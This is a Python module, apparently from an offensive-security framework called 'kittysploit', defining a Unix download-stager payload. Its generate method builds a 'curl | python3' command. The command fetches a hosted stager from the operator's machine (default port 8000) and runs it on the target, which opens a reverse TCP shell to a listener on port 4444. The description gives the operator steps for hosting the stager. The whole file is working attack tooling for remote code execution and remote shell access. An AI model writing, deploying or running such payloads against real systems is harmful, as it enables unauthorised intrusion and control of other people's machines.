#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *

from lib.c2.download_stagers import build_curl_pipe_python, build_stager_url


class Module(Payload):
    __info__ = {
        "name": "Unix Download Stager, curl | python (reverse TCP)",
        "description": (
            "Downloads a hosted Python stager from stager_url and pipes it to python3. "
            "Host the script first: save output of "
            "'generate' on payloads/singles/cmd/multi/python_thin_stager to stager.py, "
            "then run 'python -m http.server' on stager_port. "
            "Delivers a reverse_tcp session after second stage runs."
        ),
        "category": PayloadCategory.CMD,
        "platform": Platform.UNIX,
        "listener": "listeners/multi/reverse_tcp",
        "handler": Handler.REVERSE,
        "session_type": SessionType.SHELL,
    }

    lhost = OptString("127.0.0.1", "Callback host (embedded in hosted stager)", True)
    lport = OptPort(4444, "Callback port for reverse_tcp listener", True)
    stager_url = OptString(
        "",
        "Full URL of hosted Python stager (empty = http://lhost:stager_port/stager.py)",
        False,
    )
    stager_port = OptInteger(
        8000,
        "Operator HTTP port serving stager.py when stager_url is empty",
        False,
        advanced=True,
    )
    python_binary = OptString("python3", "Python interpreter on target", False)

    def generate(self):
        url = str(self.stager_url or "").strip()
        if not url:
            url = build_stager_url(str(self.lhost), int(self.stager_port or 8000), "/stager.py")
            print_info(f"stager_url not set — using {url} (host stager.py on stager_port)")
        return build_curl_pipe_python(url, str(self.python_binary or "python3"))
